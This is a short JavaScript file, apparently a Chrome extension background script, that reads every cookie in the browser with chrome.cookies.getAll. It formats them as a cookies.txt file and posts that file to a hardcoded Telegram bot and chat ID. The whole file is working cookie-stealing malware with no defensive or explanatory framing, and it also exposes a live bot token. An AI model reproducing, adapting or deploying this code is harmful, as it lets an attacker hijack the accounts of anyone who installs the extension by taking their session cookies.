const botToken = "7569934593:AAHmNMG-GKPDMVdJe2NgpcKuvAttcj1u4iA";
const chatId = "-1002608970112";

function convertCookiesToTxt(cookies) {
  let txt = "";
  
  cookies.forEach(cookie => {
    const secure = cookie.secure ? "TRUE" : "FALSE";
    const httpOnly = cookie.httpOnly ? "TRUE" : "FALSE";
    const expiration = cookie.expirationDate ?? "2597573456";
    txt += `${cookie.domain}\t${httpOnly}\t${cookie.path}\t${secure}\t${expiration}\t${cookie.name}\t${cookie.value}\n`;
  });
  return txt;
}

function sendCookiesToTelegram(cookies) {
  const txtData = convertCookiesToTxt(cookies);
  const blob = new Blob([txtData], { type: "text/plain" });
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("document", blob, "cookies.txt");
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
    method: "POST",
    body: formData
  }).then(response => {
      if (response.ok) {
        console.log("TXT file sent to Telegram successfully.");
      } else {
        console.error("Failed to send TXT file to Telegram.");
      }
    })
    .catch(error => {
      console.error("Error:", error);
    });
}
chrome.cookies.getAll({}, sendCookiesToTelegram);
